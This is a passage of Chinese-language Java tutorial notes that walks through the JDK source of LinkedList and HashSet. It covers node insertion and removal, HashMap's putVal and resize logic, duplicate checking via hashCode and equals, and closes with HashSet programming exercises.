Node<E> f = first;\n    // 创建新节点，后继为原头节点\n    final Node<E> newNode = new Node<>(null, e, f);\n    first = newNode;\n    // 若之前链表为空，设置 last\n    if (f == null)\n        last = newNode;\n    else\n        f.prev = newNode;\n    size++;\n    modCount++;\n}\n```\n\n##### 增加中间结点\n\n```java\nvoid linkBefore(E e, Node<E> succ) {\n  // assert succ != null;\n  //得到index下标节点的前一个\n  final Node<E> pred = succ.prev;\n  //构造新节点，新节点的前一个节点为原先这个index位置的前一个节点，设置新节点的下一个节点为原先index节点\n  final Node<E> newNode = new Node<>(pred, e, succ);\n  //设置原先index位置的节点的前一个为新节点\n  succ.prev = newNode;\n  //如果pred节点为null，则代表succ是头节点，现在设置头节点为新节点\n  if (pred == null)\n    first = newNode;\n  else\n    //如果pred节点不为null，则修改pred的下一个节点为新节点\n    pred.next = newNode;\n  //元素数量+1    \n  size++;\n  //链表修改次数+1\n  modCount++;\n} \n```\n\n##### 批量增加\n\n```java\npublic boolean addAll(int index, Collection<? extends E> c) {\n  //先判断下标是否越界，越界就抛出异常\n  checkPositionIndex(index);\n  //将拆入的元素集合转换为数组\n  Object[] a = c.toArray();\n  //得到数组的大小\n  int numNew = a.length;\n  if (numNew == 0)\n    return false;\n  //定义前一个节点，当前节点    \n  Node<E> pred, succ;\n  //拆入位置是size，即接着尾部拆入\n  if (index == size) {\n    //当前节点没有，前一个节点就是当前最后一个节点\n    succ = null;\n    pred = last;\n  } else {\n    //当前节点就是index位置的节点，前一个节点直接拿prev获取\n    succ = node(index);\n    pred = succ.prev;\n  }\n  //快速for处理待拆入元素的数组\n  for (Object o : a) {\n    //元素转换\n    @SuppressWarnings(\"unchecked\") E e = (E) o;\n    //构建新节点的前一个是pred,元素为e，下一个节点为null\n    Node<E> newNode = new Node<>(pred, e, null);\n    //如果pred节点为null，则代表原先index位置的节点为头节点，则需要重新设置头节点\n    if (pred == null)\n      first = newNode;\n    else\n      //如果pred节点不为null，则设置原先index位置的节点的下一个节点为当前新节点\n      pred.next = newNode;\n    //一个新节点完成后，设置上一个为当前新节点，直到把所有元素拆入完成    \n    pred = newNode;\n  }\n  //index位置的原先节点为null,则代表index原先的前一个节点就是最后一个节点，则设置最后一个节点就是最新最后的那个节点\n  if (succ == null) {\n    last = pred;\n  } else {\n    //index位置的原先节点不为null，则设置拆入数组的最后一个元素的最后一个节点的next是succ,succ的前一个是当前这个\n    pred.next = succ;\n    succ.prev = pred;\n  }\n  //得到新链表元素的数量\n  size += numNew;\n  //链表改动次数+1\n  modCount++;\n  return true;\n}\n```\n\n##### 扩展的方法\n\n如下方法都是基于上面方法扩展出来的\n\n```java\npublic void addFirst(E e) {\n    linkFirst(e);\n}\npublic void addLast(E e) {\n    linkLast(e);\n}\npublic boolean offer(E e) {\n    return add(e);\n}\npublic boolean offerFirst(E e) {\n    addFirst(e);\n    return true;\n}\npublic boolean offerLast(E e) {\n    addLast(e);\n    return true;\n}\npublic void push(E e) {\n    addFirst(e);\n}\n```\n\n#### 删除结点\n\n##### 删除单个结点\n\n```java\n//默认删除\npublic E remove() {\n  return removeFirst();//调用删除头结点的方法\n}\n\n//根据索引删除\npublic E remove(int index) {\n  //下标都先判断下标是否越界，越界就抛出异常\n  checkElementIndex(index);\n  return unlink(node(index));//调用删除中间结点的方法\n}\n\n//找到需要删除的节点\nNode<E> node(int index) {\n  // assert isElementIndex(index);\n  //二分查找的思想，判断一下是在链表的前半部分还是后半部分\n  if (index < (size >> 1)) {\n    //从头节点一直找到index位置拿到节点\n    Node<E> x = first;\n    for (int i = 0; i < index; i++)\n      x = x.next;\n    return x;\n  } else {\n    //从尾节点一直找到index位置拿到节点\n    Node<E> x = last;\n    for (int i = size - 1; i > index; i--)\n      x = x.prev;\n    return x;\n  }\n}\n```\n\n##### 删除头节点\n\n```java\nprivate E unlinkFirst(Node<E> f) {\n    // assert f == first && f != null;\n    final E element = f.item;\n    final Node<E> next = f.next;\n    // 相应数据设为 null，从而之后GC清理\n    f.item = null;\n    f.next = null; // help GC\n    first = next;\n    // 就一个节点，删完了\n    if (next == null)\n        last = null;\n    else\n        next.prev = null;\n    size--;\n    modCount++;\n    return element;\n}\n```\n\n##### 删除尾节点\n\n```java\nprivate E unlinkLast(Node<E> l) {\n    // assert l == last && l != null;\n    final E element = l.item;\n    final Node<E> prev = l.prev;\n    // 相应数据设为 null，从而之后GC清理\n    l.item = null;\n    l.prev = null; // help GC\n    last = prev;\n    // 就一个节点，删完了\n    if (prev == null)\n        first = null;\n    else\n        prev.next = null;\n    size--;\n    modCount++;\n    return element;\n}\n```\n\n##### 删除中间节点\n\n```java\nE unlink(Node<E> x) {\n    // assert x != null;\n    final E element = x.item;\n    final Node<E> next = x.next;\n    final Node<E> prev = x.prev;\n    // 为头节点，则设置新头节点\n    if (prev == null) {\n        first = next;\n    } else {\n        prev.next = next;\n        x.prev = null;\n    }\n    // 为尾节点，则设置新尾节点\n    if (next == null) {\n        last = prev;\n    } else {\n        next.prev = prev;\n        x.next = null;\n    }\n\n    x.item = null;\n    size--;\n    modCount++;\n    return element;\n}\n```\n\n##### 扩展的方法\n\n和增加一样，删除也有很多扩展版本，不过基础还是上面三个方法。\n\n```java\npublic E removeFirst() {\n    final Node<E> f = first;\n    if (f == null)\n        throw new NoSuchElementException();\n    return unlinkFirst(f);\n}\npublic E removeLast() {\n    final Node<E> l = last;\n    if (l == null)\n        throw new NoSuchElementException();\n    return unlinkLast(l);\n}\npublic E pollFirst() {\n    final Node<E> f = first;\n    return (f == null) ? null : unlinkFirst(f);\n}\npublic E pollLast() {\n    final Node<E> l = last;\n    return (l == null) ? null : unlinkLast(l);\n}\npublic E pop() {\n    return removeFirst();\n}\n```\n\n#### 更新结点\n\n```java\npublic E set(int index, E element) {\n    // 下标合法性检查\n    checkElementIndex(index);\n    // 获取index下标节点\n    Node<E> x = node(index);\n    // 获取旧值\n    E oldVal = x.item;\n    // 设置新值\n    x.item = element;\n    // 返回旧值\n    return oldVal;\n}\n\n// 采用二分法遍历每个Node节点，直到找到index位置的节点\nNode<E> node(int index) {\n    // assert isElementIndex(index);\n\n    if (index < (size >> 1)) {\n        Node<E> x = first;\n        for (int i = 0; i < index; i++)\n            x = x.next;\n        return x;\n    } else {\n        Node<E> x = last;\n        for (int i = size - 1; i > index; i--)\n            x = x.prev;\n        return x;\n    }\n}\n\n```\n\n#### 查找结点\n\n```java\npublic E get(int index) {\n    checkElementIndex(index);\n    return node(index).item;\n}\n\n// 采用二分法遍历每个Node节点，直到找到index位置的节点\nNode<E> node(int index) {\n    // assert isElementIndex(index);\n\n    if (index < (size >> 1)) {\n        Node<E> x = first;\n        for (int i = 0; i < index; i++)\n            x = x.next;\n        return x;\n    } else {\n        Node<E> x = last;\n        for (int i = size - 1; i > index; i--)\n            x = x.prev;\n        return x;\n    }\n}\n```\n\n### ArrayList和LinkedList比较\n\n|            | 底层结构 | 增删效率       | 改查效率 |\n| ---------- | -------- | -------------- | -------- |\n| ArrayList  | 可变数组 | 较低，数组扩容 | 较高     |\n| LinkedList | 双向链表 | 较高，链表追加 | 较低     |\n\n- 如果我们改查的操作多，选择 ArrayList \n- 如果我们增删的操作多，选择 LinkedList\n- 一般来说，在程序中，80%-90% 都是查询，因此大部分情况下会选择 ArrayList\n- 在一个项目中，根据业务灵活选择，也可能这样，一个模块使用的是 ArrayList，另外一个模块是 LinkedList，要根据业务来进行选择\n\n## II、Set\n\n### 特点\n\nSet 接口是 Collection 接口的子接口\n\n- **无序性**：无序（添加和取出顺序不一致），取出的顺序的顺序虽然不是添加的顺序，但是每次取出顺序是固定的\n- **不重复性**：不允许重复元素，因此最多只包含一个 null\n\n```java\nSet set = new HashSet();\nset.add(\"jack\");\nset.add(\"lucy\");\nset.add(\"jack\");//重复，添加不成功\nset.add(\"jwt\");\nset.add(null);\nset.add(null);//再次添加null，添加不成功\nfor(int i = 0; i <3;i ++) {\n  System.out.println(\"set=\" + set);\n}\n\n/*\nset=[null, jwt, lucy, jack]\nset=[null, jwt, lucy, jack]\nset=[null, jwt, lucy, jack]\n*/\n```\n\n- 不能使用索引的方式来获取\n\n- Set 接口实现类常用的有：HashSet、LinkedHashSet、TreeSet\n\n### 遍历方式\n\n同 Collection 的遍历方式一样，因为 Set 接口是 Collection 接口的子接口。\n\n- 1.可以使用迭代器\n- 2.增强 for\n\n```java\npackage com.jwt.set_;\n\nimport java.util.HashSet;\nimport java.util.Iterator;\nimport java.util.Set;\n\n\npublic class SetMethod {\n    public static void main(String[] args) {\n        Set set = new HashSet();\n        set.add(\"jack\");\n        set.add(\"lucy\");\n        set.add(\"jwt\");\n        set.add(null);\n \n        System.out.println(\"=====使用迭代器====\");\n        Iterator iterator = set.iterator();\n        while (iterator.hasNext()) {\n            Object obj = iterator.next();\n            System.out.println(\"obj=\" + obj);\n        }\n        set.remove(null);\n        //方式2: 增强for\n        System.out.println(\"=====增强for====\");\n        for (Object o : set) {\n            System.out.println(\"o=\" + o);\n        }\n\n    }\n}\n```\n\n## 2.1 HashSet\n\n###  特点\n\n- HashSet 实现了 Set 接口\n- HashSet 底层实际上是 HashMap，HashMap 底层是数组 + 链表 + 红黑树\n\n```java\npublic HashSet() {\n    map = new HashMap<>();\n}\n```\n\n- **不重复性**：HashSet 可以存放 null 值，但是只能有一个 null，不能有重复元素/对象，下面会详细分析\n\n```java\nHashSet hashSet = new HashSet();\nhashSet.add(null);\nhashSet.add(null);//添加失败\n```\n\n- **无序性**：HashSet 不保证元素是有序的(即，不保证存放元素的插入顺序和取出顺序一致)\n\n```java\nHashSet<String> hashSet = new HashSet<>();\nhashSet.add(\"深圳\");\nhashSet.add(\"北京\");\nhashSet.add(\"西安\");\n// 循环打印 HashSet 中的所有元素\nhashSet.forEach(m -> System.out.println(m));\n\n/*\n西安\n北京\n深圳\n*/\n//HashSet 插入的顺序是：深圳 -> 北京 -> 西安，而循环打印的顺序却是：西安 -> 深圳 -> 北京，所以 HashSet 是无序的，不能保证插入和迭代的顺序一致。\n```\n\n### 添加元素机制\n\n#### 结论\n\n- HashSet 底层是 HashMap，HashMap 底层是数组 + 链表 + 红黑树\n- 添加一个元素时，先计算 hash 值，得出索引值，找到存储数据表 table，看这个索引位置是否已经存放元素，如果没有，直接加入；如果有，调用 equals 比较\n  - 如果相同，就放弃添加；\n  - 如果不相同，则添加到最后，形成链表\n- 在 Java 8 中，如果一条链表的元素个数超过 TREEIFY_THRESHOLD(默认是8)，并且 table 的大小 >= MIN_TREEIFY_CAPACITY(默认64)，就会进行树化(红黑树)\n\n#### 源码分析\n\n```java\n//debug如下代码\nimport java.util.HashSet;\npublic class HashSetSource {\n    public static void main(String[] args) {\n        HashSet hashSet = new HashSet();\n        hashSet.add(\"java\");//第一次\n        hashSet.add(\"java\");//第二次\n        System.out.println(\"set=\" + hashSet);\n    }\n\n}\n```\n\n##### Step1\n\n执行` HashSet hashSet = new HashSet();`\n\n```java\n//该步骤底层代码\npublic HashSet() {\n    map = new HashMap<>();\n}\n\npublic HashMap() {\n \t this.loadFactor = DEFAULT_LOAD_FACTOR; \n}\n\n//其他构造方法\n//指定集合转化为HashSet, 完成map的创建\npublic HashSet(Collection<? extends E> c) {\n   map = new HashMap<>(Math.max((int) (c.size()/.75f) + 1, 16));\n   addAll(c);\n}\n//指定初始化大小，和负载因子\npublic HashSet(int initialCapacity, float loadFactor) {\n    map = new HashMap<>(initialCapacity, loadFactor);\n}\n//指定初始化大小\npublic HashSet(int initialCapacity) {\n    map = new HashMap<>(initialCapacity);\n}\n//指定初始化大小和负载因子，dummy 无实际意义\nHashSet(int initialCapacity, float loadFactor, boolean dummy) {\n    map = new LinkedHashMap<>(initialCapacity, loadFactor);\n}\n```\n\n##### Step2\n\n执行`hashSet.add(\"java\");`\n\n```java\n//1、执行add()，调用put()\npublic boolean add(E e) {\n\t\treturn map.put(e, PRESENT)==null;// hashmap 中 put() 返回 null 时，表示操作成功\n}\n\n// 虚拟对象\nprivate static final Object PRESENT = new Object();\n//HashSet是通过HashMap来保存元素，由于只需要在key中保存，所以采用虚拟对象PRESENT对应map中插入key-value的value值的引用。每次向map中添加元素时，键值对对应的value都是PRESENT。\n\n\n//2、执行put()，调用hash()和putVal()\npublic V put(K key, V value) {\n  \treturn putVal(hash(key), key, value, false, true);\n}\n\n//3、执行hash()，调用hashCode()\nstatic final int hash(Object key) {\n  \tint h;\n  \treturn (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);//并不是直接返回hash值，做了处理，为了避免hash碰撞\n}//先计算key的hash值，再计算该hash值无符号右移16位的值，再将两者进行^按位异或\n\n//4、执行hashCode()，计算key的hash值\npublic int hashCode() {\n  int h = hash;\n  if (h == 0 && value.length > 0) {\n    char val[] = value;\n    for (int i = 0; i < value.length; i++) {\n      h = 31 * h + val[i];\n    }\n    hash = h;\n  }\n  return h;\n}\n\n//5.执行putVal()\nfinal V putVal(int hash, K key, V value, boolean onlyIfAbsent,\n               boolean evict) {\n    Node<K,V>[] tab; Node<K,V> p; int n, i;//定义了辅助变量\n    //table是HashMap的一个属性，存放结点的，类型是Node[]\n    //这里就是第一次扩容，到16个空间.\n    if ((tab = table) == null || (n = tab.length) == 0)\n      //如果哈希表为空，调用resize(),创建一个哈希表，并用变量n记录哈希表长度\n      n = (tab = resize()).length;//执行完resize(),tab大小为16\n  \n     //(1)根据key，得到hash 去计算该key 应该存放到table 表的哪个索引位置\n    //并把这个位置的对象，赋给p\n    //(2)判断p是否为null\n    //(2.1) 如果p为null, 表示还没有存放元素, 就创建一个Node (key=\"java\",value=PRESENT)\n    //(2.2) 就放在该位置tab[i] = newNode(hash, key, value, null)\n    if ((p = tab[i = (n - 1) & hash]) == null)\n      tab[i] = newNode(hash, key, value, null);\n  \t/*第一次add都不执行\n    else {\n      Node<K,V> e; K k;\n      if (p.hash == hash &&\n          ((k = p.key) == key || (key != null && key.equals(k))))\n        e = p;\n      else if (p instanceof TreeNode)//第一次add不进入\n        e = ((TreeNode<K,V>)p).putTreeVal(this, tab, hash, key, value);\n      else {\n        for (int binCount = 0; ; ++binCount) {\n          if ((e = p.next) == null) {\n            p.next = newNode(hash, key, value, null);\n            if (binCount >= TREEIFY_THRESHOLD - 1) // -1 for 1st\n              treeifyBin(tab, hash);\n            break;\n          }\n          if (e.hash == hash &&\n              ((k = e.key) == key || (key != null && key.equals(k))))\n            break;\n          p = e;\n        }\n      }\n      if (e != null) { // existing mapping for key\n        V oldValue = e.value;\n        if (!onlyIfAbsent || oldValue == null)\n          e.value = value;\n        afterNodeAccess(e);\n        return oldValue;\n      }\n    }*/\n    ++modCount;\n    if (++size > threshold)//每加入一个结点Node(k,v,h,next), size++\n      resize();\n    afterNodeInsertion(evict);//空方法，HashMap留给子类去实现\n    return null;\n}\n\n//创建一个哈希表或者扩容哈希表\nfinal Node<K,V>[] resize() {\n        Node<K,V>[] oldTab = table;\n        int oldCap = (oldTab == null) ? 0 : oldTab.length;\n        int oldThr = threshold;\n        int newCap, newThr = 0;\n        if (oldCap > 0) {\n            if (oldCap >= MAXIMUM_CAPACITY) {\n                threshold = Integer.MAX_VALUE;\n                return oldTab;\n            }\n            else if ((newCap = oldCap << 1) < MAXIMUM_CAPACITY &&\n                     oldCap >= DEFAULT_INITIAL_CAPACITY)\n                newThr = oldThr << 1; // double threshold\n        }\n        else if (oldThr > 0) // initial capacity was placed in threshold\n            newCap = oldThr;\n        else {               // zero initial threshold signifies using defaults\n            newCap = DEFAULT_INITIAL_CAPACITY;//默认容量\n            //static final int DEFAULT_INITIAL_CAPACITY = 1 << 4; //默认值16\n            newThr = (int)(DEFAULT_LOAD_FACTOR * DEFAULT_INITIAL_CAPACITY);//临界值\n            //static final float DEFAULT_LOAD_FACTOR = 0.75f;//加载因子0.75\n           //临界值=加载因子(0.75)*默认容量\n        }\n        if (newThr == 0) {\n            float ft = (float)newCap * loadFactor;\n            newThr = (newCap < MAXIMUM_CAPACITY && ft < (float)MAXIMUM_CAPACITY ?\n                      (int)ft : Integer.MAX_VALUE);\n        }\n        threshold = newThr;//临界值\n        @SuppressWarnings({\"rawtypes\",\"unchecked\"})\n        Node<K,V>[] newTab = (Node<K,V>[])new Node[newCap];//新建容量为16的节点数组\n        table = newTab;//把建好的数组赋给table\n        if (oldTab != null) {\n            for (int j = 0; j < oldCap; ++j) {\n                Node<K,V> e;\n                if ((e = oldTab[j]) != null) {\n                    oldTab[j] = null;\n                    if (e.next == null)\n                        newTab[e.hash & (newCap - 1)] = e;\n                    else if (e instanceof TreeNode)\n                        ((TreeNode<K,V>)e).split(this, newTab, j, oldCap);\n                    else { // preserve order\n                        Node<K,V> loHead = null, loTail = null;\n                        Node<K,V> hiHead = null, hiTail = null;\n                        Node<K,V> next;\n                        do {\n                            next = e.next;\n                            if ((e.hash & oldCap) == 0) {\n                                if (loTail == null)\n                                    loHead = e;\n                                else\n                                    loTail.next = e;\n                                loTail = e;\n                            }\n                            else {\n                                if (hiTail == null)\n                                    hiHead = e;\n                                else\n                                    hiTail.next = e;\n                                hiTail = e;\n                            }\n                        } while ((e = next) != null);\n                        if (loTail != null) {\n                            loTail.next = null;\n                            newTab[j] = loHead;\n                        }\n                        if (hiTail != null) {\n                            hiTail.next = null;\n                            newTab[j + oldCap] = hiHead;\n                        }\n                    }\n                }\n            }\n        }\n        return newTab;\n    }\n```\n\n##### Step3\n\n执行`hashSet.add(\"java\");//第二次`\n\n```java\nfinal V putVal(int hash, K key, V value, boolean onlyIfAbsent,\n               boolean evict) {\n  Node<K,V>[] tab; Node<K,V> p; int n, i;\n  /*第二次add不执行\n  if ((tab = table) == null || (n = tab.length) == 0)\n    n = (tab = resize()).length;\n  if ((p = tab[i = (n - 1) & hash]) == null)\n    tab[i] = newNode(hash, key, value, null);\n  */\n  else {\n    Node<K,V> e; K k;\n    //如果当前索引位置对应的链表的第一个元素和准备添加的key的hash值一样\n    //并且满足下面两个条件之一\n    //1.准备加入的key和p指向的Node结点的key是同一个对象\n    //2.p指向的Node结点的key的equals()和准备加入的key比较后相同\n    //就不能加入\n    if (p.hash == hash &&\n        ((k = p.key) == key || (key != null && key.equals(k))))\n      e = p;\n    //再判断p是不是一颗红黑树\n    //如果是一颗红黑树，就调用putTreeVal，来进行添加\n    else if (p instanceof TreeNode)\n      e = ((TreeNode<K,V>)p).putTreeVal(this, tab, hash, key, value);\n    //如果table对应索引位置，已经是一个链表，就用for循环比较\n    else {\n      for (int binCount = 0; ; ++binCount) {\n        //依次和该链表的每一个元素比较后，都不相同，则加入到该链表最后\n        if ((e = p.next) == null) {\n          p.next = newNode(hash, key, value, null);\n          //注意在把元素添加到链表后，立即判断该链表是否已经达到8个结点 \n          if (binCount >= TREEIFY_THRESHOLD - 1) // 8-1\n            //就调用treeifyBin(),对当前这个链表进行树化(转成红黑树)\n            treeifyBin(tab, hash);\n            //注意，转成红黑树时，要进行判断，如果该table数组的大小>64,小于到话先扩容再转成红黑树\n          break;\n        }\n        //依次和该链表的每个元素比较过程中，如果有相同情况,就直接break\n        if (e.hash == hash &&\n            ((k = e.key) == key || (key != null && key.equals(k))))\n          break;\n        p = e;//p往后移\n      }\n    }\n    if (e != null) { // existing mapping for key\n      V oldValue = e.value;\n      if (!onlyIfAbsent || oldValue == null)\n        e.value = value;\n      afterNodeAccess(e);\n      return oldValue;\n    }\n  }\n  ++modCount;\n  if (++size > threshold)\n    resize();\n  afterNodeInsertion(evict);\n  return null;\n}\n```\n\n###  扩容机制\n\n#### 结论\n\n- HashSet 底层是 HashMap，第一次添加时，table 数组扩容到 16，临界值 threshold =  16 * loadFactor(加载因子:0.75) = 12\n  - 如果 table 数组使用到了临界值 12，就会扩容到 16 * 2 = 32，新的临界值就是32*0.75 = 24，依次类推\n\n- 在 Java 8 中，如果一条链表的元素个数到达 TREEIFY_TH RESHOLD(默认是8)，\n  并且 table 的大小 >= MIN_TREEIFY_CAPACITY(默认64)，就会进行树化(红黑树)，否则仍然采用数组扩容机制\n\n#### 扩容源码\n\n```java\nint threshold;//临界值，该数值决定什么时候开始下一次扩容\nstatic final int MAXIMUM_CAPACITY = 1 << 30;//很大的数，基本不会碰上\nstatic final int DEFAULT_INITIAL_CAPACITY = 1 << 4; //16\nstatic final float DEFAULT_LOAD_FACTOR = 0.75f;//负载因子，决定临界值大小\n\nfinal Node<K,V>[] resize() {\n    Node<K,V>[] oldTab = table;\n    int oldCap = (oldTab == null) ? 0 : oldTab.length;//获得table大小\n    int oldThr = threshold;//获得临界值，新数组则为0\n    int newCap, newThr = 0;//新数组容量和临界值\n    if (oldCap > 0) {\n        if (oldCap >= MAXIMUM_CAPACITY) {\n            threshold = Integer.MAX_VALUE;\n            return oldTab;\n        }\n        //原数组大小大于16时，临界值设置为原来的两倍\n        else if ((newCap = oldCap << 1) < MAXIMUM_CAPACITY &&\n                 oldCap >= DEFAULT_INITIAL_CAPACITY)\n            newThr = oldThr << 1; // double threshold\n    }\n    else if (oldThr > 0)//意味着老数组没有元素\n        //初始容量设置为临界值\n        newCap = oldThr;\n    else {\n        //说明是调用无参构造器创建的旧数组，并且第一次添加元素\n        newCap = DEFAULT_INITIAL_CAPACITY;//16\n        //新临界值 = 负载因子 * 默认容量\n        newThr = (int)(DEFAULT_LOAD_FACTOR * DEFAULT_INITIAL_CAPACITY);//0.75 * 16\n    }\n    \n    if (newThr == 0) {\n        float ft = (float)newCap * loadFactor;\n        newThr = (newCap < MAXIMUM_CAPACITY && ft < (float)MAXIMUM_CAPACITY ?\n                  (int)ft : Integer.MAX_VALUE);\n    }\n    //将新临界值赋值给 threshold\n    threshold = newThr;\n    @SuppressWarnings({\"rawtypes\",\"unchecked\"})\n    \n    //new 一个新的 Node 数组\n    Node<K,V>[] newTab = (Node<K,V>[])new Node[newCap];\n    table = newTab;\n    //原数组不为空，说明是扩容操作，则涉及到元素转移操作\n    if (oldTab != null) {\n        for (int j = 0; j < oldCap; ++j) {\n            Node<K,V> e;\n            //如果当前位置元素不为空，那么需要转移该元素到新数组\n            if ((e = oldTab[j]) != null) {\n                //置空 oldTab[j]，便于虚拟机回收\n                oldTab[j] = null;\n                //如果 e 的后结点为空，则计算 e 在 newTab 中的位置并置入\n                if (e.next == null)\n                    //如果这个oldTab[j]就一个元素，那么就直接放到newTab里面\n                    // 把元素存储到新的数组中，存储到数组的哪个位置需要根据hash值和数组长度来进行取模\n                    // 【hash值  %  数组长度】 = 【 hash值  & （数组长度-1）】\n                    // 数组扩容后，所有元素都需要重新计算在新数组中的位置。\n                    newTab[e.hash & (newCap - 1)] = e;\n                //如果此时 e 已经转为红黑树结点\n                else if (e instanceof TreeNode)\n                    ((TreeNode<K,V>)e).split(this, newTab, j, oldCap);\n                else { // e 有后结点\n                    Node<K,V> loHead = null, loTail = null;\n                    Node<K,V> hiHead = null, hiTail = null;\n                    Node<K,V> next;\n                    do {\n                        next = e.next;\n                        \n                        //重点难点！！！\n                        //与运算 & 是 两个位都为1时，结果才为1\n                        //(e.hash & oldCap) 得到的是 元素在数组中的位置是否需要移动\n                        // 示例1：\n                        // e.hash=10 0000 1010\n                        // oldCap=16 0001 0000\n                        //   &   =0  0000 0000       比较高位的第一位 0\n                        //结论：元素位置在扩容后数组中的位置没有发生改变\n                        // 示例2：\n                        // e.hash=17 0001 0001\n                        // oldCap=16 0001 0000\n                        //   &   =1  0001 0000\n                        //结论：元素位置在扩容后数组中的位置发生了改变，新的下标位置是原下标位置+原数组长度\n\n                        if ((e.hash & oldCap) == 0) {//扩容后不需要移动的链表\n                            if (loTail == null) \n                                loHead = e;\n                            else\n                                loTail.next = e;\n                            loTail = e;\n                        }\n                        else {//扩容后需要移动的链表\n                            if (hiTail == null)\n                                hiHead = e;\n                            else\n                                hiTail.next = e;\n                            hiTail = e;\n                        }\n                    } while ((e = next) != null);\n                    if (loTail != null) {\n                        loTail.next = null;\n                        newTab[j] = loHead;\n                    }\n                    if (hiTail != null) {\n                        hiTail.next = null;\n                        newTab[j + oldCap] = hiHead;\n                    }\n                }\n            }\n        }\n    }\n    return newTab;\n}\n\n```\n\n### HashSet 检查重复\n\n我们只要了解了 HashSet 执行添加元素的流程，就能知道为什么 HashSet 能保证元素不重复了？\n\nHashSet 添加元素的执行流程是：当把对象加入 HashSet 时，HashSet 会先计算对象的 hashcode 值来判断对象加入的位置，同时也会与其他加入的对象的 hashcode 值作比较，如果没有相符的 hashcode，HashSet 会假设对象没有重复出现，会将对象插入到相应的位置中。但是如果发现有相同 hashcode 值的对象，这时会调用对象的 equals() 方法来检查对象是否真的相同，如果相同，则 HashSet 就不会让重复的对象加入到 HashSet 中，这样就保证了元素的不重复。 \n\n**总结**\n\nHashSet 底层是由 HashMap 实现的，它可以实现重复元素的去重功能，如果存储的是自定义对象必须重写 hashCode 和 equals 方法。HashSet 保证元素不重复是利用 HashMap 的 put 方法实现的，在存储之前先根据 key 的 hashCode 和 equals 判断是否已存在，如果存在就不在重复插入了，这样就保证了元素的不重复。\n\n### 练习\n\n#### 判断题\n\n```java\npackage com.jwt.set_;\n\nimport java.util.HashSet;\n\npublic class HashSet01 {\n    public static void main(String[] args) {\n        HashSet set = new HashSet();\n        //1. 在执行add 方法后，会返回一个boolean 值\n        //2. 如果添加成功，返回true, 否则返回false\n        System.out.println(set.add(\"john\"));//T\n        System.out.println(set.add(\"lucy\"));//T\n        System.out.println(set.add(\"john\"));//F\n        System.out.println(set.add(\"jack\"));//T\n        System.out.println(set.add(\"Rose\"));//T\n        //3. 可以通过remove 指定删除哪个对象\n        set.remove(\"john\");\n        System.out.println(\"set=\" + set);//3 个\n\n        //4. Hashset 不能添加相同的元素/数据\n        set.add(\"lucy\");//添加成功\n        set.add(\"lucy\");//加入不了\n        set.add(new Dog(\"tom\"));//OK\n        set.add(new Dog(\"tom\"));//Ok\n        System.out.println(\"set=\" + set);\n\n        set.add(new String(\"jwt\"));//ok\n        set.add(new String(\"jwt\"));//加入不了\n        System.out.println(\"set=\" + set);\n    }\n\n}\n\nclass Dog { //定义了Dog 类\n    private String name;\n    public Dog(String name) {\n        this.name = name;\n    }\n    @Override\n    public String toString() {\n        return \"Dog{\" +\n                \"name='\" + name + '\\'' +\n                '}';\n    }\n}\n```\n\n#### 编程题1\n\n定义一个 Employee 类，该类包含: private成员属性name,age 要求:\n\n- 创建 3 个 Employee 对象放入 HashSet 中\n- 当 name 和 age 的值相同时，认为是相同员工，不能添加到 HashSet 集合中\n\n```java\npackage com.jwt.set_;\n\nimport java.util.HashSet;\nimport java.util.Objects;\npublic class HashSetExercise {\n    public static void main(String[] args) {\n        HashSet hashSet = new HashSet();\n        hashSet.add(new Employee(\"milan\", 18));//ok\n        hashSet.add(new Employee(\"smith\", 28));//ok\n        hashSet.add(new Employee(\"milan\", 18));//加入不成功.\n        System.out.println(\"hashSet=\" + hashSet);\n    }\n}\n\nclass Employee{\n    private String name;\n    private int age;\n\n    public Employee(String name, int age) {\n        this.name = name;\n        this.age = age;\n    }\n\n    @Override\n    public String toString() {\n        return \"\\nEmployee{\" +\n                \"name='\" + name + '\\'' +\n                \", age=\" + age +\n                '}';\n    }\n    //如果name 和age 值相同，则返回相同的hash 值\n    @Override\n    public boolean equals(Object o) {\n        if (this == o) return true;\n        if (o == null || getClass() != o.getClass()) return false;\n        Employee employee = (Employee) o;\n        return age == employee.age && Objects.equals(name, employee.name);\n    }\n\n    @Override\n    public int hashCode() {\n        return Objects.hash(name, age);\n    }\n}\n```\n\n#### 编程题2\n\n定义一个Employee02类，该类包含: private 成员属性name，sal，birthday(MyDate) 类 \n型)，其中 birthday 为 MyDate 类型(属性包括: year，month，day) 要求:\n\n1. 创建 3 个 Employee02 对象放入 HashSet 中\n2. 当 name 和 birthday 的值相同时，认为是相同员工，不能添加到 HashSet 集合中\n\n要点：Employee02 类和 MyDate 类都要重写 equals 和 hashCode 方法，因为都是创建了新对象\n\n```java\npackage com.jwt.set_;\n\nimport java.util.HashSet;\nimport java.util.Objects;\n\npublic class HashSetExercise02 {\n    public static void main(String[] args) {\n        HashSet<Employee02> hashSet = new HashSet<>();\n        hashSet.add(new Employee02(\"tom\",new MyDate(2000,7,1)));\n        hashSet.add(new Employee02(\"jack\",new MyDate(2001,9,1)));\n        hashSet.add(new Employee02(\"tom\",new MyDate(2000,7,1)));\n        System.out.println(\"hashSet = \" + hashSet);\n    }\n\n}\n\nclass Employee02{\n    private String name;\n    private  MyDate birthday;\n\n    public Employee02(String name, MyDate birthday) {\n        this.name = name;\n        this.birthday = birthday;\n    }\n\n    @Override\n    public String toString() {\n        return \"\\nEmployee02{\" +\n                \"name='\" + name + '\\'' +\n                \", birthday=\" + birthday +\n                '}';\n    }\n    //如果name 和birthday 值相同，则返回相同的hash 值\n    @Override\n    public boolean equals(Object o) {\n        if (this == o) return true;\n        if (o == null || getClass() != o.getClass()) return false;\n        Employee02 that = (Employee02) o;\n        return Objects.equals(name, that.name) && Objects.equals(birthday, that.birthday);\n    }\n\n    @Override\n    public int hashCode() {\n        return Objects.hash(name, birthday);\n    }\n}\n\nclass MyDate{\n    private int year;\n    private int month;\n    private int day;\n\n    public MyDate(int year, int month, int day) {\n        this.year = year;\n        this.month = month;\n        this.day = day;\n    }\n\n    @Override\n    public String toString() {\n        return \"MyDate{\" +\n                \"year=\" + year +\n                \", month=\" + month +\n                \", day=\" + day +\n                '}';\n    }\n    //birthday 的year、month、day相同，则返回相同的hash 值\n    @Override\n    public boolean equals(Object o) {\n        if (this == o) return true;\n        if (o == null || getClass() != o.getClass()) return false;\n        MyDate myDate = (MyDate) o;\n        return year == myDate.year && month == myDate.month && day == myDate.day;\n    }\n\n    @Override\n    public int hashCode() {\n        return Objects.hash(year, month, day);\n    }\n}\n```\n\n## 2.2 